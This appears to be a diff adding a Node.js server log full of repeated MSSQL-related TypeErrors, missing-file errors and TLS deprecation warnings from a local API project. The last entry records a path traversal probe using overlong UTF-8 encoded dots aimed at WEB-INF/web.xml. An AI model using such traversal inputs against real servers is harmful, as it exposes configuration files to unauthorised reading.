+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:15116) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:6956) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:19496) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:90
+            Results = recordsets.recordsets[0]
+                                 ^
+
+TypeError: Cannot read properties of undefined (reading 'recordsets')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:90:34
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:440:25
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:312) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:90
+            Results = recordsets.recordsets[0]
+                                 ^
+
+TypeError: Cannot read properties of undefined (reading 'recordsets')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:90:34
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:440:25
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:17028) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:90
+            Results = recordsets.recordsets[0]
+                                 ^
+
+TypeError: Cannot read properties of undefined (reading 'recordsets')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:90:34
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:440:25
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:9980) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:90
+            Results = recordsets.recordsets[0]
+                                 ^
+
+TypeError: Cannot read properties of undefined (reading 'recordsets')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:90:34
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:440:25
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:11384) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:90
+            Results = recordsets.recordsets[0]
+                                 ^
+
+TypeError: Cannot read properties of undefined (reading 'recordsets')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:90:34
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:440:25
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:9712) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:90
+            Results = recordsets.recordsets[0]
+                                 ^
+
+TypeError: Cannot read properties of undefined (reading 'recordsets')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:90:34
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:440:25
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:18132) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:18372) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:90
+            Results = recordsets.recordsets[0]
+                                 ^
+
+TypeError: Cannot read properties of undefined (reading 'recordsets')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:90:34
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:440:25
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:9684) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:90
+            Results = recordsets.recordsets[0]
+                                 ^
+
+TypeError: Cannot read properties of undefined (reading 'recordsets')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:90:34
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:440:25
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:17348) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:90
+            Results = recordsets.recordsets[0]
+                                 ^
+
+TypeError: Cannot read properties of undefined (reading 'recordsets')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:90:34
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:440:25
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:3572) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:90
+            Results = recordsets.recordsets[0]
+                                 ^
+
+TypeError: Cannot read properties of undefined (reading 'recordsets')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:90:34
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:440:25
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:15768) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:13288) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:48
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:48:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:12420) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:48
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:48:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:11608) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:12
+            res.status(200).send(recordsets.recordsets[0])
+                                            ^
+
+TypeError: Cannot read properties of undefined (reading 'recordsets')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:12:45
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:440:25
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:420:25
+    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
+
+Node.js v18.15.0
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:12
+            res.status(200).send(recordsets.recordsets[0])
+                                            ^
+
+TypeError: Cannot read properties of undefined (reading 'recordsets')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:12:45
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:440:25
+    at Immediate.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:364:23)
+    at process.processImmediate (node:internal/timers:478:21)
+
+Node.js v18.15.0
+(node:4864) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:48
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:48:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:18012) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:48
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:48:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:18644) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:48
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:48:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:18808) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:48
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:48:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:17524) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:12136) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:48
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:48:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:16492) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:17760) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:48
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:48:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:18756) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:48
+            const SearchedItems = Results.find((Result) => Result.ID == Object.values(req.params)[0])
+                                          ^
+
+TypeError: Cannot read properties of undefined (reading 'find')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:48:43
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28)
+    at Parser.emit (node:events:513:28)
+    at Readable.<anonymous> (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\token\token-stream-parser.js:32:12)
+    at Readable.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+
+Node.js v18.15.0
+(node:19408) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+node:internal/fs/utils:347
+    throw err;
+    ^
+
+Error: ENOENT: no such file or directory, lstat 'c:/xampp/htdocs/bauereg/api/css/bootstrap.css'
+    at Object.lstatSync (node:fs:1593:3)
+    at Server.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:24:12)
+    at Server.emit (node:events:513:28)
+    at parserOnIncoming (node:_http_server:1072:12)
+    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17) {
+  errno: -4058,
+  syscall: 'lstat',
+  code: 'ENOENT',
+  path: 'c:/xampp/htdocs/bauereg/api/css/bootstrap.css'
+}
+
+Node.js v18.15.0
+node:internal/fs/utils:347
+    throw err;
+    ^
+
+Error: ENOENT: no such file or directory, lstat 'c:/xampp/htdocs/bauereg/api/css/bootstrap.css'
+    at Object.lstatSync (node:fs:1593:3)
+    at Server.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:24:12)
+    at Server.emit (node:events:513:28)
+    at parserOnIncoming (node:_http_server:1072:12)
+    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17) {
+  errno: -4058,
+  syscall: 'lstat',
+  code: 'ENOENT',
+  path: 'c:/xampp/htdocs/bauereg/api/css/bootstrap.css'
+}
+
+Node.js v18.15.0
+node:internal/fs/utils:347
+    throw err;
+    ^
+
+Error: ENOENT: no such file or directory, lstat 'c:/xampp/htdocs/bauereg/api/js/jquery.nicescroll.min.js'
+    at Object.lstatSync (node:fs:1593:3)
+    at Server.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:24:12)
+    at Server.emit (node:events:513:28)
+    at parserOnIncoming (node:_http_server:1072:12)
+    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17) {
+  errno: -4058,
+  syscall: 'lstat',
+  code: 'ENOENT',
+  path: 'c:/xampp/htdocs/bauereg/api/js/jquery.nicescroll.min.js'
+}
+
+Node.js v18.15.0
+(node:16512) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+node:_http_outgoing:884
+    throw new ERR_INVALID_ARG_TYPE(
+    ^
+
+TypeError [ERR_INVALID_ARG_TYPE]: The "chunk" argument must be of type string or an instance of Buffer or Uint8Array. Received an instance of Array
+    at new NodeError (node:internal/errors:399:5)
+    at write_ (node:_http_outgoing:884:11)
+    at ServerResponse.write (node:_http_outgoing:849:15)
+    at Server.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:48:17)
+    at Server.emit (node:events:513:28)
+    at parserOnIncoming (node:_http_server:1072:12)
+    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17) {
+  code: 'ERR_INVALID_ARG_TYPE'
+}
+
+Node.js v18.15.0
+node:_http_outgoing:884
+    throw new ERR_INVALID_ARG_TYPE(
+    ^
+
+TypeError [ERR_INVALID_ARG_TYPE]: The "chunk" argument must be of type string or an instance of Buffer or Uint8Array. Received an instance of Array
+    at new NodeError (node:internal/errors:399:5)
+    at write_ (node:_http_outgoing:884:11)
+    at ServerResponse.write (node:_http_outgoing:849:15)
+    at Server.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:48:17)
+    at Server.emit (node:events:513:28)
+    at parserOnIncoming (node:_http_server:1072:12)
+    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17) {
+  code: 'ERR_INVALID_ARG_TYPE'
+}
+
+Node.js v18.15.0
+node:_http_outgoing:884
+    throw new ERR_INVALID_ARG_TYPE(
+    ^
+
+TypeError [ERR_INVALID_ARG_TYPE]: The "chunk" argument must be of type string or an instance of Buffer or Uint8Array. Received an instance of Array
+    at new NodeError (node:internal/errors:399:5)
+    at write_ (node:_http_outgoing:884:11)
+    at ServerResponse.write (node:_http_outgoing:849:15)
+    at Server.<anonymous> (C:\xampp\htdocs\bauereg\api\app.js:48:17)
+    at Server.emit (node:events:513:28)
+    at parserOnIncoming (node:_http_server:1072:12)
+    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17) {
+  code: 'ERR_INVALID_ARG_TYPE'
+}
+
+Node.js v18.15.0
+(node:57008) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:57008) MaxListenersExceededWarning: Possible EventEmitter memory leak detected. 11 error listeners added to [ConnectionPool]. Use emitter.setMaxListeners() to increase limit
+(node:38072) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+URIError: Failed to decode param '/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml'
+    at decodeURIComponent (<anonymous>)
